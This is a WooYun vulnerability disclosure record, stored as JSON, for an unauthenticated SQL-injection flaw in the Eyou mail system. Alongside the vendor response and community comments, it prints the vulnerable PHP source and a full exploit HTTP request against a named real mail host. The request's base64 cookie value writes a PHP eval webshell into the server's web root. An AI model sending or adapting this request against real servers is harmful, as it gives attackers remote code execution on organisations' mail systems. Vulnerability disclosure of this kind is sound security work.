{"id": 1796, "wybug_id": "wooyun-2014-068235", "wybug_title": "亿邮邮件系统SQL导致批量GetShell（无需登录）", "wybug_corp": "北京亿中邮信息技术有限公司", "wybug_author": "路人甲", "wybug_date": "2014-07-12 08:34", "wybug_open_date": "2014-08-26 08:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向公众公开  简要描述： 亿邮邮件系统SQL导致批量GetShell（至少几百个单位） 详细说明：  漏洞文件：\\php\\bill\\print_addfeelog.php执行任意SQL命令，且不受GPC影响。默认MYSQL都是有权限导出文件权限的，可以导出一句话后门。\n<?\tinclude(\"include/config.inc\");\tinclude(\"include/mysql_wrap.php\");\tinclude(\"include/utils.php\");\tinclude(\"include/message.php\");\tinclude(\"common/check_admin.php\");\t\t$sql = base64_decode($_REQUEST['all_sql']);\t$eyouSql = new eyousql();\t$eyouSql->query($sql);?>\n利用代码：\nPOST /php/bill/print_addfeelog.php HTTP/1.1Content-Length: 140Host: mail.sihs.edu.cnUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.2; zh-CN; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-usAccept-Encoding: gzip,deflateAccept-Charset: GB2312,utf-8;q=0.7,*;q=0.7Keep-Alive: 115Connection: keep-aliveX-Forwarded-For: 127.0.0.1Cookie: cookie=1;all_sql=c2VsZWN0ICc8P3BocCBldmFsKCRfUE9TVFsxXSk/PmMnIGludG8gb3V0ZmlsZSAnL3Zhci9leW91L2FwYWNoZS9odGRvY3MvcGhwL2JpbGwvc2NyaXB0L2luZGV4LnBocCc7\n   漏洞证明：  \n\n   修复方案：  不知道这个文件干嘛的？删除可好。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-07-13 18:13 厂商回复： 经查存在某些版本中，现在已有解决方案，我们将会与客户联系，并尽快修正，非常感谢提供漏洞信息！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-12 09:00 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  这个屌    \n     2014-07-12 09:10 |    \t\tCyrils \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:10        | the more the better)\t\t \n  Mark...    \n     2014-07-12 09:13 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  屌    \n     2014-07-12 09:22 |    \t\t屎蛋 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | boom)\t\t \n  mark    \n     2014-07-12 11:16 |    \t\tDot \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 我就佩服Ph牛！)\t\t \n  坐等    \n     2014-07-12 11:36 |    \t\tHackPanda \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:15        | Talk is cheap,show me the shell.)\t\t \n  哪个版本？    \n     2014-07-12 11:59 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  v5以上的么？    \n     2014-07-12 13:06 |    \t\txiaokinghk \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:16        | 【DBA】)\t\t \n  MARK    \n     2014-07-12 13:19 |    \t\tJJ Fly \t\t\t( 普通白帽子  |\t\t\t        Rank:317 漏洞数:59        | 今天播下一颗种子。)\t\t \n  mark上    \n     2014-07-12 13:46 |    \t\tSct7p \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 懂与不懂之间只隔了一层纸，懂的人会觉得很...)\t\t \n   水表在外面，包裹送门卫    \n     2014-07-12 15:14 |    \t\treality0ne \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:7        )\t\t \n  mark在此    \n     2014-07-12 16:02 |    \t\tBloodwolf \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:8        | whoami)\t\t \n  水表在外面，包裹送门卫    \n     2014-07-12 16:04 |    \t\t1fn0 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:7        | 我是运维 不要开除我)\t\t \n  mark    \n     2014-07-12 16:27 |    \t\t小新 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:19        | 我可是要成为普通白帽子的小新)\t\t \n  我擦，竟然忘了登录    \n     2014-07-12 20:24 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  MLGBD   爆破4组准备    \n     2014-08-02 19:17 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。这代码 给跪了。。    \n     2014-08-02 20:49 |    \t\tJJ Fly \t\t\t( 普通白帽子  |\t\t\t        Rank:317 漏洞数:59        | 今天播下一颗种子。)\t\t \n  好神奇    \n     2014-08-04 22:32 |    \t\t书生今天不吃饭 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 没人来过。。。。。)\t\t \n  mark    \n     2014-08-05 13:49 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  来看看代码    \n     2014-08-26 10:05 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  楼主的菜刀不错哦    \n     2014-09-21 21:17 |    \t\tSura、Rain \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:8        | 关注Java WEB安全)\t\t \n  这刀过狗？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}